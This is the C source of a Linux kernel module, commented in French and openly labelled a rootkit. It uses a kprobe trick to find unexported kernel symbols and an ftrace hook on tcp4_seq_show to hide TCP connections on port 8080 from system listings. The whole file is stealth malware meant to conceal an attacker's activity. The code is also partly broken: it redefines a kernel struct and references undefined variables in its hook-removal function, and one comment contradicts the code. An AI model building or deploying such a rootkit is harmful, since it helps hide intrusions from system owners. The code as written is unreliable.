#include <linux/init.h>
#include <linux/module.h> // pour manipuler les modules du noyau
#include <linux/kernel.h>
#include <linux/syscalls.h> // pour intercepter les syscalls
#include <linux/kallsyms.h> //pour la réflexion des symboles du kernel
#include <linux/version.h>
#include <linux/ftrace.h> // Include this header for struct ftrace_ops
#include <linux/linkage.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/kprobes.h>
#include <net/tcp.h>

// licence du module (GPL = General Public License) en gros opensource
// le LKM sera marqué comme propriétaire si on ne mets pas ca et si le noyau impose des restrictions sur les modules propriétaires, ca peut poser des problemes
MODULE_LICENSE("GPL");
MODULE_AUTHOR("victor");
// pour avoir la description quand on fait modinfo 
MODULE_DESCRIPTION("Hide LKM");
MODULE_VERSION("0.01");

// check la version du kernel, pt_regs pour les syscall en 4.17 ou plus
#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
#define PTREGS_SYSCALL_STUBS 1
#endif

// en 5.7 ou +, kallsyms_lookup_name (qui sert a la réflexion d'une f°) est plus dispo, mais kprobes peut faire le job
// kprobs permet d'inspecter et de modifier le comportement d'une fonction pdt l'éxécution
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
#define KPROBE_LOOKUP 1
#include <linux/kprobes.h>

static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name"
};
#endif

// On évite les récursions pour le boucles infinies
#define USE_FENTRY_OFFSET 0
#if !USE_FENTRY_OFFSET
#pragma GCC optimize("-fno-optimize-sibling-calls")
#endif

// hook -> mecanismes pour intercepter l'éxécution d'un fonction
// ftrace -> technique de tracage du noyau qui sert a intercepter f°

// Define la struct ftrace_ops, défini les fonctions a intercépté 
struct ftrace_ops {
    int (*func)(unsigned long, unsigned long, struct ftrace_ops *, struct pt_regs *);
    unsigned long flags;
    void *private;
    struct list_head list;
    struct ftrace_ops *next;
    int (*init)(struct ftrace_ops *);
    void (*exit)(struct ftrace_ops *);
};

// Define the ftrace_hook structure
struct ftrace_hook {
    const char *name;
    void *function;
    void *original;

    unsigned long address;
    struct ftrace_ops ops;
};

// Define the HOOK macro
#define HOOK(_name, _function, _original) \
    {                                     \
        .name = (_name),                  \
        .function = (_function),          \
        .original = (_original),          \
    }

int fh_install_hook(struct ftrace_hook *hook);
void fh_remove_hook(struct ftrace_hook *hook);
void fh_remove_hooks(struct ftrace_hook *hooks, size_t count);
int fh_install_hooks(struct ftrace_hook *hooks, size_t count);



// f° qui résoud l'adr de la f° a hook
static int fh_resolve_hook_address(struct ftrace_hook *hook)
{

// petite douille pour pouvoir utiliser kallsyms_lookup_name sans que la fonction soit exporté
#ifdef KPROBE_LOOKUP
    typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
    kallsyms_lookup_name_t kallsyms_lookup_name;
    register_kprobe(&kp);
    printk(KERN_DEBUG "rootkit: Resolving kallsyms_lookup_name\n");
    kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;    
    unregister_kprobe(&kp);
    if (!kallsyms_lookup_name) {
        printk(KERN_DEBUG "rootkit: kallsyms_lookup_name is NULL\n");
        return -ENOENT;
    }

#endif

    // ensuite on stock l'adr de la f° dans hook->address
    printk(KERN_DEBUG "rootkit: Resolving address for %s\n", hook->name);
    hook->address = kallsyms_lookup_name(hook->name);
    printk(KERN_DEBUG "rootkit: Resolved address: %lx\n", hook->address);

    if (!hook->address)
    {   
        // si on trouve pas l'adr, on affiche un msg d'erreur erreur no entity
        printk(KERN_DEBUG "rootkit: kallsyms_lookup_name() failed for %s\n", hook->name);
        return -ENOENT;
    }

    // si on a pas trouvé l'adr, on retourne 0  
    #if USE_FENTRY_OFFSET
        *((unsigned long*) hook->original) = hook->address + MCOUNT_INSN_SIZE;
    #else
        *((unsigned long*) hook->original) = hook->address;
    #endif

    printk(KERN_DEBUG "rootkit: Resolved address for %s: %p\n", hook->name, (void *)hook->address);
    return 0;
}


// fonction qui redirige l'exécution vers la nouvelle fonction définie dans le hook
static int notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *ops, struct pt_regs *regs)
{
    // container_of -> donne l'adr de la structure qui contient ops(qui contient les info du hook)
    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);

    // on vérifie si l'adr de la f° est dans le module courant (sinon boucle infini)
    if(!within_module(parent_ip, THIS_MODULE))
        // ip -> adr de l'instruction actuellement éxécuté
        regs->ip = (unsigned long) hook->function;

    return 0;
}



int fh_install_hook(struct ftrace_hook *hook)
{
    int err;
    err = fh_resolve_hook_address(hook);
    printk(KERN_DEBUG "rootkit: fh_resolve_hook_address() returned: %d\n", err);
    if (err) {
        printk(KERN_DEBUG "rootkit: fh_resolve_hook_address() failed: %d\n", err);
        return err;
    }

    hook->ops.func = fh_ftrace_thunk;

    printk(KERN_DEBUG "rootkit: Attempting to set filter for address: %p\n", (void *)hook->address);
    printk(KERN_DEBUG "rootkit: hook->ops.func = %p\n", hook->ops.func);
    printk(KERN_DEBUG "rootkit: hook->ops.flags = %lx\n", hook->ops.flags);
    printk(KERN_DEBUG "rootkit: hook->function = %p\n", hook->function);
    printk(KERN_DEBUG "rootkit: hook->original = %p\n", hook->original);

    err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
    printk(KERN_DEBUG "rootkit: ftrace_set_filter for address: %p returned: %d\n", (void *)hook->address, err);
    if (err) {
        printk(KERN_DEBUG "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
        return err;
    }

    err = register_ftrace_function(&hook->ops);
    if (err) {
        printk(KERN_DEBUG "rootkit: register_ftrace_function() failed: %d\n", err);
        return err;
    }

    printk(KERN_DEBUG "rootkit: Hook installed successfully for address: %p\n", (void *)hook->address);

    return 0;
}



// fais l'inverse de fh_install_hook
void fh_remove_hook(struct ftrace_hook *hook)
{
    int err;
    //désenregistre le hook
    err = unregister_ftrace_function(&hook->ops);
    if(err)
    {
        printk(KERN_DEBUG "rootkit: unregister_ftrace_function() failed: %d\n", err);
    }

    // supprime l'adr de la fonction hookée de la liste des adr filtrées
    err = ftrace_set_filter_ip(hooks[i].function, hooks[i].replace, 0, 0);
    if(err)
    {
        printk(KERN_DEBUG "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
    }
}



// installe plusieurs hooks (itère dans un tableau pour les installer un par un)
int fh_install_hooks(struct ftrace_hook *hooks, size_t count)
{
    int err;
    size_t i;

    for (i = 0 ; i < count ; i++)
    {   
        // on installe le hook
        err = fh_install_hook(&hooks[i]);
        if(err)
            goto error;
    }
    return 0;

error:
    while (i != 0)
    {   
        // si on a une erreur, on enlève les hooks un par un
        fh_remove_hook(&hooks[--i]);
    }
    return err;
}

// fait l'inverse de fh_install_hooks (enlève les hooks un par un)
void fh_remove_hooks(struct ftrace_hook *hooks, size_t count)
{
    size_t i;

    for (i = 0 ; i < count ; i++)
        fh_remove_hook(&hooks[i]);
}

// tcp4_sqe_show() est la fonction qui affiche les connexions TCP
// un pointeur vers une structure sock est passé en 2eme argument
// on check sa valeur, si le port qu'on veut, on return 0 pour ne pas l'afficher
// va savoir pourquoi, le premier argument v est des fois pas initialisé
// ducoup on check, si c'est le cas, v = 0x1
static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);

static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v)
{
    struct sock *sk = v;

    // on check si le port est 8080 (0x1f90 en héxa)
    // si sk ne pointe sur rien, alors il pointe sur 0x1
    if (sk != NULL) {
        printk(KERN_INFO "rootkit: sk_num = %u\n", sk->sk_num);
        if (sk->sk_num == 0x1f90) {
            printk(KERN_INFO "rootkit: Hiding port 8080\n");
            return 0;
        }
    } else {
        printk(KERN_INFO "rootkit: sk is NULL\n");
    }
    
    
    return orig_tcp4_seq_show(seq, v);
}


static struct ftrace_hook hooks[] = {
    HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show),
};

static int __init rootkit_init(void)
{
    int err;
    printk(KERN_INFO "rootkit: Installing hook for tcp4_seq_show\n");
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if(err) {
        printk(KERN_ERR "rootkit: Failed to install hook\n");
        printk(KERN_ERR "rootkit: Error code: %d\n", err);
        return err;
    }

    printk(KERN_INFO "rootkit: Loaded >:-)\n");

    return 0;
}

static void __exit rootkit_exit(void)
{
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    printk(KERN_INFO "rootkit: Unloaded :-(\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
